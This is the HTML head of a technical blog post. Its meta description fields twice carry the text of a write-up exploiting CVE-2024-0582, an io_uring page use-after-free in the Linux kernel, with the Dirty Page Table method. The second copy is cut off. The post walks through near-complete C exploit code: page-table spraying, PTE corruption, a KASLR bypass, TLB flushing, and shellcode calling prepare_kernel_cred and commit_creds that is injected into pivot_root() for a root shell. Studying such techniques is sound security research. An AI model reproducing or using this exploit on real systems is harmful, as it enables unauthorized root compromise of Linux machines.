<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.3.2" /><meta property="og:title" content="Exploiting CVE-2024-0582 via the Dirty Page Table Method" /><meta property="og:locale" content="en" /><meta name="description" content="Introduction This post discusses a popular exploitation method in today’s cybersecurity community. Specifically, we’ll dive into the Dirty Page Table method by showcasing its use on a real-world page UAF (use-after-free) vulnerability in io_uring. Although this article addresses the vulnerability itself, our focus is on the exploitation technique rather than the bug’s details. For an in-depth analysis of the vulnerability, you can read Oriol Castejón’s blog. Vulnerability In 2024, a Project Zero issue popped up, revealing a powerful new bug in the io_uring module. The issue mentioned a page UAF (use-after-free) primitive that gives attackers a chance to write data over previously freed pages. This primitive is considered substantially dangerous in terms of exploitability nowadays because it allows attackers to easily implement data-only attacking methods that manipulate physical memory. To demonstrate the Dirty Page Table attacking method, this article uses the PoC that was provided by a Project Zero issue. Exploitation In typical object-based UAF exploits, it’s important to gain control of the memory slab that held the freed object in order to perform effective heap spraying. In our scenario, however, the vulnerability is page-based, meaning we control an entire page of memory. This broader control simplifies and enhances our ability to spray and manipulate memory. When the kernel allocates page tables, it requests a free page from the buddy allocator. If we have control over a freed page in the buddy allocator, we can cause the kernel to reuse that page for its page table allocation. Once the kernel uses this controlled page as a page table, we can poison the Page Table Entries (PTEs). The Dirty Page Table technique exploits a dangling page (freed but not yet reclaimed) to corrupt these PTEs. By modifying a PTE, we redirect a user-space virtual address to a chosen kernel-space physical address. This allows us to overwrite a targeted region of kernel memory (in this exploit, the memory backing the pivot_root() system call), enabling us to inject and execute shellcode. The following code snippet prepares pages and sets up io_uring before triggering the bug. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 int main(void) { int ret; void *overlap_page = NULL, *pbuf_mapping = NULL; void *page_spray[N_PAGESPRAY]; struct io_uring_buf_reg reg = { .ring_entries = 1, .bgid = 0, .flags = IOU_PBUF_RING_MMAP }; struct io_uring_buf_reg unreg; struct io_uring_params params; memset(&amp;unreg, 0, sizeof(unreg)); memset(&amp;params, 0, sizeof(params)); printf(&quot;[*] PID: %d\n&quot;, getpid()); fflush(stdout); /* Bind process to current CPU core */ set_cpu_affinity(); printf(&quot;[*] Initializing io_uring...\n&quot;); fflush(stdout); int uring_fd = io_uring_setup(40, &amp;params); if (uring_fd &lt; 0) { perror(&quot;io_uring_setup&quot;); exit(EXIT_FAILURE); } /* Prepare pages (PTE not allocated at this moment) */ for (int i = 0; i &lt; N_PAGESPRAY; i++) { page_spray[i] = mmap((void *)(0x200000 + i * 0x10000UL), 0x8000, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0); if (page_spray[i] == MAP_FAILED) { perror(&quot;mmap failed&quot;); exit(EXIT_FAILURE); } } printf(&quot;[*] io_uring instance created (fd: %d).\n&quot;, uring_fd); fflush(stdout); /* Register a buffer ring with io_uring */ printf(&quot;[*] Registering buffer ring with io_uring...\n&quot;); fflush(stdout); ret = io_uring_register(uring_fd, IORING_REGISTER_PBUF_RING, &amp;reg, 1); if (ret &lt; 0) { perror(&quot;io_uring_register (PBUF_RING) failed&quot;); close(uring_fd); exit(EXIT_FAILURE); } /* Map the buffer ring with mmap */ pbuf_mapping = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_PBUF_RING); if (pbuf_mapping == MAP_FAILED) { perror(&quot;mmap for buffer ring failed&quot;); close(uring_fd); exit(EXIT_FAILURE); } printf(&quot;[*] Buffer ring address: %p\n&quot;, pbuf_mapping); fflush(stdout); ... Then, the exploit triggers the vulnerability by unregistering the buffer ring, which frees the page and returns it to the buddy allocator. 1 2 3 4 5 6 7 8 9 printf(&quot;[*] Unregistering buffer ring...\n&quot;); fflush(stdout); ret = io_uring_register(uring_fd, IORING_UNREGISTER_PBUF_RING, &amp;unreg, 1); if (ret &lt; 0) { perror(&quot;io_uring_unregister (PBUF_RING) failed&quot;); munmap(pbuf_mapping, 0x1000); close(uring_fd); exit(EXIT_FAILURE); } At that point, the exploit needs to write data to the previously allocated pages in order to spray page tables. Albeit it reserved the pages beforehand using mmap, the page tables are allocated when those pages are written to. 1 2 3 4 5 6 7 8 /* Spray page table entries (PTEs) by writing to mapped pages */ printf(&quot;[*] Spraying page tables...\n&quot;); fflush(stdout); for (int i = 0; i &lt; N_PAGESPRAY; i++) { for (int j = 0; j &lt; 8; j++) { *((char *)page_spray[i] + j * 0x1000) = &#39;a&#39;; } } The following figure illustrates the memory layout after a successful heap spray. When the exploit reads memory through a dangling pointer referencing the vulnerable page, it confirms that multiple distinct Page Table Entries (PTEs) have been created. It then selects the PTE located at the 8th index, corresponding to an offset of 0x38, to overwrite. 1 2 3 4 5 6 7 8 9 /* Inspect the PTEs in the mapped buffer */ uint64_t *page_table_entry = (uint64_t *)((char *)pbuf_mapping + 0x38); for (size_t offset = 0; offset &lt; 0x40; offset += sizeof(uint64_t)) { uint64_t value = *((uint64_t *)((char *)pbuf_mapping + offset)); printf(&quot;[*] PTE (%p): 0x%llx\n&quot;, (void *)((char *)pbuf_mapping + offset), (value &amp; ~0xfffULL) &amp; ~(1ULL &lt;&lt; 63)); fflush(stdout); } These PTEs refer to one of the pages sprayed earlier, with each PTE covering a 0x1000-sized memory region. By patching the entry at offset 0x38, the exploit gains control over the address range from pbuf_mapping + 0x7000 to pbuf_mapping + 0x8000. By replacing the PTEs’ physical addresses with kernel physical addresses, the exploit effectively gains the ability to write to targeted kernel memory locations via userspace pages. However, most physical addresses are randomized when Kernel Address Space Layout Randomization (KASLR) is enabled; therefore, KASLR must first be bypassed. At this stage, the exploit can’t directly overwrite a PTE with the address of a kernel function because it does not yet know the kernel’s physical base address. Instead, the exploit overwrites the PTE with a fixed physical value that will lead to a kernel pointer leak—thereby bypassing KASLR. For instance, the value 0x800000000009c067, which I found from this blog post created by @ptr-yudai. While reading that blog post, I also discovered a useful tool worth mentioning: a customized version of GEF by @bata24, which allows traversing physical memory addresses directly in GDB. 1 2 3 4 5 /* Modify the PTE to leak the corresponding kernel physical address */ *page_table_entry = 0x800000000009c067; printf(&quot;[*] Updated PTE value: 0x%lx\n&quot;, *page_table_entry); printf(&quot;[*] Searching for overlapping page...\n&quot;); fflush(stdout); As a result of this PTE modification, one of the sprayed pages will now overlap with another page that contains a physical address we intend to leak. To find which page was affected, the exploit checks the bytes on each sprayed page (which were originally set to &#39;a&#39;). If any page no longer contains the expected values, it means that the page’s mapping has changed. That page is identified as the overlapping page containing the leaked address. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 for (int i = 0; i &lt; N_PAGESPRAY; i++) { for (int j = 0; j &lt; 8; j++) { if (*((char *)page_spray[i] + j * 0x1000) != &#39;a&#39;) { overlap_page = (char *)page_spray[i] + j * 0x1000; printf(&quot;[*] Overlapping page found: %p\n&quot;, overlap_page); fflush(stdout); break; } } } if (overlap_page == NULL) { fprintf(stderr, &quot;[-] Overlapping page not found!\n&quot;); exit(EXIT_FAILURE); } After identifying the overlapping page, the exploit proceeds to calculate the kernel’s physical base address by subtracting a predefined dummy offset, which may vary by kernel version. Once the base address is computed, it checks whether the result is greater than KERNEL_PHYSICAL_BASE_ADDR (typically 0x1000000) to determine whether KASLR is enabled on the target system. If the calculated physical address is less than 0x1000000, it indicates that KASLR is disabled and the kernel’s physical base address is statically set to 0x1000000. 1 2 3 4 5 6 7 8 /* Calculate kernel physical base. */ size_t kernel_phys_base = ((*(size_t *)overlap_page) &amp; ~0xfffULL) - 0x2604000; if (kernel_phys_base &lt; KERNEL_PHYSICAL_BASE_ADDR) { printf(&quot;[*] KASLR is not enabled on the target system!\n&quot;); kernel_phys_base = KERNEL_PHYSICAL_BASE_ADDR; } printf(&quot;[*] Kernel physical base address: 0x%016lx\n&quot;, kernel_phys_base); fflush(stdout); The calculated physical base address corresponds to the _text symbol in the kernel. By adding an appropriate offset to this base address, the exploit can redirect the overlapping page to a desired kernel address. The offsets of functions and structures remain consistent across both virtual and physical address spaces; hence, to determine these offsets, we can subtract the virtual or physical base address from the corresponding target virtual or physical address. The resulting offset is then added to the physical base address to compute the correct physical address. This calculated physical address is subsequently used to overwrite the PTE, allowing the userspace-controlled page to directly point to the targeted kernel memory region. Additionally, a useful GDB command—monitor gva2gpa—can translate a given virtual address into its corresponding physical address, simplifying this address resolution process during debugging. Next, to correctly patch the shellcode with valid kernel virtual addresses, the exploit must leak a kernel pointer and use it to calculate the correct kernel’s virtual base address. To achieve this, it overwrites the PTE of its overlapping page with the physical address of the init_task structure. This causes a kernel address (from the init_task structure) to be mapped into user-space, leaking a kernel virtual address. It then calculates the virtual base address of the kernel—typically corresponding to the _text symbol—by subtracting a predefined dummy offset from the leaked address. There’s one important detail to be cautious about. On my system, with KASLR enabled, the physical address of the init_task_struct was around 0xb480c900. However, because only the lower 4 bytes of this address could be written into the PTE, the value actually set was 0x80000000b480c067. This maps to an address 0x900 bytes before the init_task_struct. In my case, this misalignment was not an issue (since the leaked pointer was still valid). Nonetheless, if you want to eliminate the discrepancy, you can simply add 0x900 to your overlapped userspace page pointer to ensure proper alignment with the actual location of init_task_struct. 1 2 3 4 5 6 7 8 9 10 11 12 /* Patch the PTE to point to the initial task struct and leak its address to calculate the kernel&#39;s virtual base */ uint64_t phys_func = kernel_phys_base + INIT_TASK_STRUCT; *page_table_entry = (phys_func &amp; ~0xfffULL) | 0x8000000000000067ULL; printf(&quot;[*] Updated PTE value: 0x%lx\n&quot;, *page_table_entry); fflush(stdout); flush_tlb_and_print(overlap_page, 0x1000); printf(&quot;[*] Leaked kernel pointer from the kernel mapping of the initial task struct: 0x%016zx\n&quot;, *(size_t *)overlap_page); fflush(stdout); uint64_t kernel_virtual_addr_base = (*(size_t *)overlap_page) - 0x1a0c000; printf(&quot;[*] Kernel virtual base address: 0x%lx\n&quot;, kernel_virtual_addr_base); fflush(stdout); There’s a particularly important detail in this part of the code: the flush_tlb_and_print() function, which the exploit uses to flush the TLB after overwriting the PTE. In modern CPU architectures, the Translation Lookaside Buffer (TLB) is a cache that speeds up the translation of virtual addresses to physical addresses by storing recently used PTEs. Therefore, after modifying a PTE, the CPU may still reference the old, cached translation. To ensure the new PTE mapping takes effect, the TLB must be forcibly flushed. This is essential to access the memory region corresponding to the updated PTE. In the exploit, this TLB flushing is performed using the mprotect() system call. First, the memory permissions for the corrupted page are changed to read-only. Meanwhile, the TLB was forced to flush its cached entry for that page. Then, the original permissions are restored to read-and-write, ensuring that the memory can be accessed as intended after the flush. If you want to dive deeper into the TLB flushing, you may find this impressive paper particularly insightful. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 /* Flushes the TLB by temporarily changing memory permissions */ void flush_tlb_and_print(void *ptr, size_t count) { uint64_t *addresses = (uint64_t *)ptr; if (mprotect(addresses, count, PROT_READ) == -1) { perror(&quot;mprotect (set PROT_READ)&quot;); exit(EXIT_FAILURE); } /* Restore original permissions */ if (mprotect(addresses, count, PROT_READ | PROT_WRITE) == -1) { perror(&quot;mprotect (restore PROT_READ | PROT_WRITE)&quot;); exit(EXIT_FAILURE); } printf(&quot;[*] TLB flushed by changing memory permissions.\n&quot;); fflush(stdout); } Since we have identified both the physical and virtual base addresses of the kernel and understand the structure of PTEs, we can now write the shellcode into the pivot_root() syscall using the following code. Be sure to account for the offset issue mentioned earlier, as it is crucial when the exploit patches the PTE with the physical address of the pivot_root() syscall. 1 2 3 4 5 6 /* Patch the PTE to point to the kernel address of the pivot_root syscall */ phys_func = kernel_phys_base + PIVOT_ROOT_OFFSET; *page_table_entry = (phys_func &amp; ~0xfffULL) | 0x8000000000000067ULL; flush_tlb_and_print(overlap_page, 0x1000); printf(&quot;[*] Leaked kernel pointer from the kernel mapping of the pivot_root syscall: 0x%016zx\n&quot;, *(size_t *)overlap_page); fflush(stdout); Before writing our shellcode to the address space of the pivot_root() syscall, we first need to patch it with the correct kernel function addresses. To achieve this, we calculate the virtual addresses of init_task_struct, prepare_kernel_cred(), and commit_creds() by adding their known offsets to the leaked virtual base address of the kernel. If you need help finding the offset values of these elements, you can refer to this GitHub page. Despite the fact that these are 64-bit addresses, the exploit only embeds the lower 4 bytes. This is because the shellcode is crafted without the 0xffffffff prefix, which represents the upper 32 bits of a full 64-bit address. Besides, the exploit stores these values as uint32_t to simplify the patching process and avoid introducing null bytes, which could interfere with shellcode execution. Otherwise, including full 64-bit addresses directly might result in unexpected behavior or crashes. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 char shellcode[] = &quot;\x48\x31\xFF&quot; /* xor rdi, rdi */ &quot;\x48\xC7\xC7\x00\xB9\xA0\x82&quot; /* mov rdi, 0xffffffff82a0b900 --&gt; Placeholder for init_task_struct */ &quot;\x48\xC7\xC1\xF0\x81\x0B\x81&quot; /* mov rcx, 0xffffffff810b81f0 --&gt; Placeholder for prepare_kernel_cred() */ &quot;\xFF\xD1&quot; /* call rcx */ &quot;\x48\x89\xC7&quot; /* mov rdi, rax */ &quot;\x48\xC7\xC1\x60\x7F\x0B\x81&quot; /* mov rcx, 0xffffffff810b7f60 --&gt; Placeholder for commit_creds() */ &quot;\xFF\xD1&quot; /* call rcx */ &quot;\xC3&quot;; /* ret */ /* Calculate the proper addresses to be patched in */ uint32_t real_init_task = (uint32_t)(kernel_virtual_addr_base + INIT_TASK_STRUCT); uint32_t real_prepare_kernel_cred = (uint32_t)(kernel_virtual_addr_base + PREPARE_KERNEL_CRED_OFFSET); uint32_t real_commit_creds = (uint32_t)(kernel_virtual_addr_base + COMMIT_CREDS_OFFSET); printf(&quot;[*] Patching shellcode...\n&quot;); printf(&quot;[*] init_task_struct: 0x0xffffffff%08x\n&quot;, real_init_task); printf(&quot;[*] prepare_kernel_cred: 0x0xffffffff%08x\n&quot;, real_prepare_kernel_cred); printf(&quot;[*] commit_creds: 0x0xffffffff%08x\n&quot;, real_commit_creds); fflush(stdout); memcpy(&amp;shellcode[6], &amp;real_init_task, sizeof(real_init_task)); memcpy(&amp;shellcode[13], &amp;real_prepare_kernel_cred, sizeof(real_prepare_kernel_cred)); memcpy(&amp;shellcode[25], &amp;real_commit_creds, sizeof(real_commit_creds)); Finally, the exploit writes its shellcode to the address space of the pivot_root() syscall via the corrupted page. If the last 2 bytes of your pivot_root() syscall’s offset include a value like 0x2bf900, you’ll need to add the page offset (0x900 in this case) to your overlapped userspace page address before calling memcpy(). In my case, however, the offset of pivot_root is 0x2bf000, so no adjustment is necessary. It then invokes the pivot_root() syscall, which results in the execution of the injected shellcode — ultimately yielding a root shell :) 1 2 3 4 5 6 7 8 9 10 /* Write the patched shellcode to the overlapping page */ printf(&quot;[*] Writing shellcode to overlapped page at %p...\n&quot;, overlap_page); fflush(stdout); memcpy(overlap_page, shellcode, sizeof(shellcode)); printf(&quot;[*] Shellcode written successfully.\n&quot;); fflush(stdout); /* Trigger shellcode execution by invoking pivot_root syscall */ pivot_root(&quot;/opt&quot;, &quot;/opt/aa&quot;); get_shell(); Conclusion To sum up, I demonstrated the Dirty Page Table attack technique by exploiting a page-based use-after-free vulnerability discovered by Project Zero in the Linux kernel’s io_uring subsystem. If you’re interested in data-only attack strategies, you can check out my GitHub repository, which includes proof-of-concept exploits for this vulnerability using both the Dirty Cred and Dirty Page Table methods." /><meta property="og:description" content="Introduction This post discusses a popular exploitation method in today’s cybersecurity community. Specifically, we’ll dive into the Dirty Page Table method by showcasing its use on a real-world page UAF (use-after-free) vulnerability in io_uring. Although this article addresses the vulnerability itself, our focus is on the exploitation technique rather than the bug’s details. For an in-depth analysis of the vulnerability, you can read Oriol Castejón’s blog. Vulnerability In 2024, a Project Zero issue popped up, revealing a powerful new bug in the io_uring module. The issue mentioned a page UAF (use-after-free) primitive that gives attackers a chance to write data over previously freed pages. This primitive is considered substantially dangerous in terms of exploitability nowadays because it allows attackers to easily implement data-only attacking methods that manipulate physical memory. To demonstrate the Dirty Page Table attacking method, this article uses the PoC that was provided by a Project Zero issue. Exploitation In typical object-based UAF exploits, it’s important to gain control of the memory slab that held the freed object in order to perform effective heap spraying. In our scenario, however, the vulnerability is page-based, meaning we control an entire page of memory. This broader control simplifies and enhances our ability to spray and manipulate memory. When the kernel allocates page tables, it requests a free page from the buddy allocator. If we have control over a freed page in the buddy allocator, we can cause the kernel to reuse that page for its page table allocation. Once the kernel uses this controlled page as a page table, we can poison the Page Table Entries (PTEs). The Dirty Page Table technique exploits a dangling page (freed but not yet reclaimed) to corrupt these PTEs. By modifying a PTE, we redirect a user-space virtual address to a chosen kernel-space physical address. This allows us to overwrite a targeted region of kernel memory (in this exploit, the memory backing the pivot_root() system call), enabling us to inject and execute shellcode. The following code snippet prepares pages and sets up io_uring before triggering the bug. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 int main(void) { int ret; void *overlap_page = NULL, *pbuf_mapping = NULL; void *page_spray[N_PAGESPRAY]; struct io_uring_buf_reg reg = { .ring_entries = 1, .bgid = 0, .flags = IOU_PBUF_RING_MMAP }; struct io_uring_buf_reg unreg; struct io_uring_params params; memset(&amp;unreg, 0, sizeof(unreg)); memset(&amp;params, 0, sizeof(params)); printf(&quot;[*] PID: %d\n&quot;, getpid()); fflush(stdout); /* Bind process to current CPU core */ set_cpu_affinity(); printf(&quot;[*] Initializing io_uring...\n&quot;); fflush(stdout); int uring_fd = io_uring_setup(40, &amp;params); if (uring_fd &lt; 0) { perror(&quot;io_uring_setup&quot;); exit(EXIT_FAILURE); } /* Prepare pages (PTE not allocated at this moment) */ for (int i = 0; i &lt; N_PAGESPRAY; i++) { page_spray[i] = mmap((void *)(0x200000 + i * 0x10000UL), 0x8000, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0); if (page_spray[i] == MAP_FAILED) { perror(&quot;mmap failed&quot;); exit(EXIT_FAILURE); } } printf(&quot;[*] io_uring instance created (fd: %d).\n&quot;, uring_fd); fflush(stdout); /* Register a buffer ring with io_uring */ printf(&quot;[*] Registering buffer ring with io_uring...\n&quot;); fflush(stdout); ret = io_uring_register(uring_fd, IORING_REGISTER_PBUF_RING, &amp;reg, 1); if (ret &lt; 0) { perror(&quot;io_uring_register (PBUF_RING) failed&quot;); close(uring_fd); exit(EXIT_FAILURE); } /* Map the buffer ring with mmap */ pbuf_mapping = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_PBUF_RING); if (pbuf_mapping == MAP_FAILED) { perror(&quot;mmap for buffer ring failed&quot;); close(uring_fd); exit(EXIT_FAILURE); } printf(&quot;[*] Buffer ring address: %p\n&quot;, pbuf_mapping); fflush(stdout); ... Then, the exploit triggers the vulnerability by unregistering the buffer ring, which frees the page and returns it to the buddy allocator. 1 2 3 4 5 6 7 8 9 printf(&quot;[*] Unregistering buffer ring...\n&quot;); fflush(stdout); ret = io_uring_register(uring_fd, IORING_UNREGISTER_PBUF_RING, &amp;unreg, 1); if (ret &lt; 0) { perror(&quot;io_uring_unregister (PBUF_RING) failed&quot;); munmap(pbuf_mapping, 0x1000); close(uring_fd); exit(EXIT_FAILURE); } At that point, the exploit needs to write data to the previously allocated pages in order to spray page tables. Albeit it reserved the pages beforehand using mmap, the page tables are allocated when those pages are written to. 1 2 3 4 5 6 7 8 /* Spray page table entries (PTEs) by writing to mapped pages */ printf(&quot;[*] Spraying page tables...\n&quot;); fflush(stdout); for (int i = 0; i &lt; N_PAGESPRAY; i++) { for (int j = 0; j &lt; 8; j++) { *((char *)page_spray[i] + j * 0x1000) = &#39;a&#39;; } } The following figure illustrates the memory layout after a successful heap spray. When the exploit reads memory through a dangling pointer referencing the vulnerable page, it confirms that multiple distinct Page Table Entries (PTEs) have been created. It then selects the PTE located at the 8th index, corresponding to an offset of 0x38, to overwrite. 1 2 3 4 5 6 7 8 9 /* Inspect the PTEs in the mapped buffer */ uint64_t *page_table_entry = (uint64_t *)((char *)pbuf_mapping + 0x38); for (size_t offset = 0; offset &lt; 0x40; offset += sizeof(uint64_t)) { uint64_t value = *((uint64_t *)((char *)pbuf_mapping + offset)); printf(&quot;[*] PTE (%p): 0x%llx\n&quot;, (void *)((char *)pbuf_mapping + offset), (value &amp; ~0xfffULL) &amp; ~(1ULL &lt;&lt; 63)); fflush(stdout); } These PTEs refer to one of the pages sprayed earlier, with each PTE covering a 0x1000-sized memory region. By patching the entry at offset 0x38, the exploit gains control over the address range from pbuf_mapping + 0x7000 to pbuf_mapping + 0x8000. By replacing the PTEs’ physical addresses with kernel physical addresses, the exploit effectively gains the ability to write to targeted kernel memory locations via userspace pages. However, most physical addresses are randomized when Kernel Address Space Layout Randomization (KASLR) is enabled; therefore, KASLR must first be bypassed. At this stage, the exploit can’t directly overwrite a PTE with the address of a kernel function because it does not yet know the kernel’s physical base address. Instead, the exploit overwrites the PTE with a fixed physical value that will lead to a kernel pointer leak—thereby bypassing KASLR. For instance, the value 0x800000000009c067, which I found from this blog post created by @ptr-yudai. While reading that blog post, I also discovered a useful tool worth mentioning: a customized version of GEF by @bata24, which allows traversing physical memory addresses directly in GDB. 1 2 3 4 5 /* Modify the PTE to leak the corresponding kernel physical address */ *page_table_entry = 0x800000000009c067; printf(&quot;[*] Updated PTE value: 0x%lx\n&quot;, *page_table_entry); printf(&quot;[*] Searching for overlapping page...\n&quot;); fflush(stdout); As a result of this PTE modification, one of the sprayed pages will now overlap with another page that contains a physical address we intend to leak. To find which page was affected, the exploit checks the bytes on each sprayed page (which were originally set to &#39;a&#39;). If any page no longer contains the expected values, it means that the page’s mapping has changed. That page is identified as the overlapping page containing the leaked address. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 for (int i = 0; i &lt; N_PAGESPRAY; i++) { for (int j = 0; j &lt; 8; j++) { if (*((char *)page_spray[i] + j * 0x1000) != &#39;a&#39;) { overlap_page = (char *)page_spray[i] + j * 0x1000; printf(&quot;[*] Overlapping page found: %p\n&quot;, overlap_page); fflush(stdout); break; } } } if (overlap_page == NULL) { fprintf(stderr, &quot;[-] Overlapping page not found!\n&quot;); exit(EXIT_FAILURE); } After identifying the overlapping page, the exploit proceeds to calculate the kernel’s physical base address by subtracting a predefined dummy offset, which may vary by kernel version. Once the base address is computed, it checks whether the result is greater than KERNEL_PHYSICAL_BASE_ADDR (typically 0x1000000) to determine whether KASLR is enabled on the target system. If the calculated physical address is less than 0x1000000, it indicates that KASLR is disabled and the kernel’s physical base address is statically set to 0x1000000. 1 2 3 4 5 6 7 8 /* Calculate kernel physical base. */ size_t kernel_phys_base = ((*(size_t *)overlap_page) &amp; ~0xfffULL) - 0x2604000; if (kernel_phys_base &lt; KERNEL_PHYSICAL_BASE_ADDR) { printf(&quot;[*] KASLR is not enabled on the target system!\n&quot;); kernel_phys_base = KERNEL_PHYSICAL_BASE_ADDR; } printf(&quot;[*] Kernel physical base address: 0x%016lx\n&quot;, kernel_phys_base); fflush(stdout); The calculated physical base address corresponds to the _text symbol in the kernel. By adding an appropriate offset to this base address, the exploit can redirect the overlapping page to a desired kernel address. The offsets of functions and structures remain consistent across both virtual and physical address spaces; hence, to determine these offsets, we can subtract the virtual or physical base address from the corresponding target virtual or physical address. The resulting offset is then added to the physical base address to compute the correct physical address. This calculated physical address is subsequently used to overwrite the PTE, allowing the userspace-controlled page to directly point to the targeted kernel memory region. Additionally, a useful GDB command—monitor gva2gpa—can translate a given virtual address into its corresponding physical address, simplifying this address resolution process during debugging. Next, to correctly patch the shellcode with valid kernel virtual addresses, the exploit must leak a kernel pointer and use it to calculate the correct kernel’s virtual base address. To achieve this, it overwrites the PTE of its overlapping page with the physical address of the init_task structure. This causes a kernel address (from the init_task structure) to be mapped into user-space, leaking a kernel virtual address. It then calculates the virtual base address of the kernel—typically corresponding to the _text symbol—by subtracting a predefined dummy offset from the leaked address. There’s one important detail to be cautious about. On my system, with KASLR enabled, the physical address of the init_task_struct was around 0xb480c900. However, because only the lower 4 bytes of this address could be written into the PTE, the value actually set was 0x80000000b480c067. This maps to an address 0x900 bytes before the init_task_struct. In my case, this misalignment was not an issue (since the leaked pointer was still valid). Nonetheless, if you want to eliminate the discrepancy, you can simply add 0x900 to your overlapped userspace page pointer to ensure proper alignment with the actual location of init_task_struct. 1 2 3 4 5 6 7 8 9 10 11 12 /* Patch the PTE to point to the initial task struct and leak its address to calculate the kernel&#39;s virtual base */ uint64_t phys_func = kernel_phys_base + INIT_TASK_STRUCT; *page_table_entry = (phys_func &amp; ~0xfffULL) | 0x8000000000000067ULL; printf(&quot;[*] Updated PTE value: 0x%lx\n&quot;, *page_table_entry); fflush(stdout); flush_tlb_and_print(overlap_page, 0x1000); printf(&quot;[*] Leaked kernel pointer from the kernel mapping of the initial task struct: 0x%016zx\n&quot;, *(size_t *)overlap_page); fflush(stdout); uint64_t kernel_virtual_addr_base = (*(size_t *)overlap_page) - 0x1a0c000; printf(&quot;[*] Kernel virtual base address: 0x%lx\n&quot;, kernel_virtual_addr_base); fflush(stdout); There’s a particularly important detail in this part of the code: the flush_tlb_and_print() function, which the exploit uses to flush the TLB after overwriting the PTE. In modern CPU architectures, the Translation Lookaside Buffer (TLB) is a cache that speeds up the translation of virtual addresses to physical addresses by storing recently used PTEs. Therefore, after modifying a PTE, the CPU may still reference the old, cached translation. To ensure the new PTE mapping takes effect, the TLB must be forcibly flushed. This is essential to access the memory region corresponding to the updated PTE. In the exploit, this TLB flushing is performed using the mprotect() system call. First, the memory permissions for the corrupted page are changed to read-only. Meanwhile, the TLB was forced to flush its cached entry for that page. Then, the original permissions are restored to read-and-write, ensuring that the memory can be accessed as intended after the flush. If you want to dive deeper into the TLB flushing, you may find this impressive paper particularly insightful. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 /* Flushes the TLB by temporarily changing memory permissions */ void flush_tlb_and_print(void *ptr, size_t count) { uint64_t *addresses = (uint64_t *)ptr; if (mprotect(addresses, count, PROT_READ) == -1) { perror(&quot;mprotect (set PROT_READ)&quot;); exit(EXIT_FAILURE); } /* Restore original permissions */ if (mprotect(addresses, count, PROT_READ | PROT_WRITE) == -1) { perror(&quot;mprotect (restore PROT_READ | PROT_WRITE)&quot;); exit(EXIT_FAILURE); } printf(&quot;[*] TLB flushed by changing memory permissions.\n&quot;); fflush(stdout); } Since we have identified both the physical and virtual base addresses of the kernel and understand the structure of PTEs, we can now write the shellcode into the pivot_root() syscall using the following code. Be sure to account for the offset issue mentioned earlier, as it is crucial when the exploit patches the PTE with the physical address of the pivot_root() syscall. 1 2 3 4 5 6 /* Patch the PTE to point to the kernel address of the pivot_root syscall */ phys_func = kernel_phys_base + PIVOT_ROOT_OFFSET; *page_table_entry = (phys_func &amp; ~0xfffULL) | 0x8000000000000067ULL; flush_tlb_and_print(overlap_page, 0x1000); printf(&quot;[*] Leaked kernel pointer from the kernel mapping of the pivot_root syscall: 0x%016zx\n&quot;, *(size_t *)overlap_page); fflush(stdout); Before writing our shellcode to the address space of the pivot_root() syscall, we first need to patch it with the correct kernel function addresses. To achieve this, we calculate the virtual addresses of init_task_struct, prepare_kernel_cred(), and commit_creds() by adding their known offsets to the leaked virtual base address of the kernel. If you need help finding the offset values of these elements, you can refer to this GitHub page. Despite the fact that these are 64-bit addresses, the exploit only embeds the lower 4 bytes. This is because the shellcode is crafted without the 0xffffffff prefix, which represents the upper 32 bits of a full 64-bit address. Besides, the exploit stores these values as uint32_t to simplify the patching process and avoid introducing null bytes, which could interfere with shellcode execution. Otherwise, including full 64-bit addresses directly might result in unexpected behavior or crashes. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 char shellcode[] = &quot;\x48\x31\xFF&quot; /* xor rdi, rdi */ &quot;\x48\xC7\xC7\x00\xB9\xA0\x82&quot; /* mov rdi, 0xffffffff82a0b900 --&gt; Placeholder for init_task_struct */ &quot;\x48\xC7\xC1\xF0\x81\x0B\x81&quot; /* mov rcx, 0xffffffff810b81f0 --&gt; Placeholder for prepare_kernel_cred() */ &quot;\xFF\xD1&quot; /* call rcx */ &quot;\x48\x89\xC7&quot; /* mov rdi, rax */ &quot;\x48\xC7\xC1\x60\x7F\x0B\x81&quot; /* mov rcx, 0xffffffff810b7f60 --&gt; Placeholder for commit_creds() */ &quot;\xFF\xD1&quot; /* call rcx */ &quot;\xC3&quot;; /* ret */ /* Calculate the proper addresses to be patched in */ uint32_t real_init_task = (uint32_t)(kernel_virtual_addr_base + INIT_TASK_STRUCT); uint32_t real_prepare_kernel_cred = (uint32_t)(kernel_virtual_addr_base + PREPARE_KERNEL_CRED_OFFSET); uint32_t real_commit_creds = (uint32_t)(kernel_virtual_addr_base + COMMIT_CREDS_OFFSET); printf(&quot;[*] Patching shellcode...\n&quot;); printf(&quot;[*] init_task_struct: 0x0xffffffff%08x\n&quot;, real_init_task); printf(&quot;[*] prepare_kernel_cred: 0x0xffffffff%08x\n&quot;, real_prepare_kernel_cred); printf(&quot;[*] commit_creds: 0x0xffffffff%08x\n&quot;, real_commit_creds); fflush(stdout); memcpy(&amp;shellcode[6], &amp;real_init_task, sizeof(real_init_task)); memcpy(&amp;shellcode[13], 